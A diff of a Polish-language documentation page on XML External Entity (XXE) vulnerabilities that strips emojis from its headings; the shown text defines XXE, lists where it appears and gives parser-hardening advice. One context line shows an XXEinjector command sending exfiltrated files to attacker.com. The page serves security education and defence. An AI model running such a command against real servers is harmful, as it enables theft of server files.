@@ -1,17 +1,16 @@
 ---
 id: "xxe"
 title: "XML External Entity (XXE)"
-sidebar_label: "📄 XML External Entity (XXE)"
 sidebar_position: 15
 ---
 
-# 📄 XML External Entity (XXE)
+# XML External Entity (XXE)
 
 XXE to podatność występująca, gdy aplikacja parsuje dane XML dostarczone przez użytkownika, a parser ma włączoną obsługę **encji zewnętrznych (external entities)**. Pozwala to atakującemu odczytywać pliki serwera, przeprowadzać SSRF, eksfiltrować dane, a w niektórych przypadkach doprowadzić do RCE lub DoS.
 
 ---
 
-## 🧠 Gdzie szukać XXE?
+##  Gdzie szukać XXE?
 
 XXE pojawia się wszędzie, gdzie serwer przyjmuje XML:
 - Klasyczne formularze i API z `Content-Type: application/xml` lub `text/xml`.
@@ -113,7 +112,7 @@ ruby XXEinjector.rb --host=attacker.com --httpport=8080 --file=request.txt --pat
 
 ---
 
-## 🔐 Jak zabezpieczyć aplikację przed XXE?
+##  Jak zabezpieczyć aplikację przed XXE?
 ✅ **Wyłącz obsługę DTD i encji zewnętrznych** w parserze XML (najskuteczniejsze).
 ✅ **Używaj bezpiecznej konfiguracji parsera** – np. w Javie `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
 ✅ **Preferuj prostsze formaty** (JSON) tam, gdzie XML nie jest konieczny.
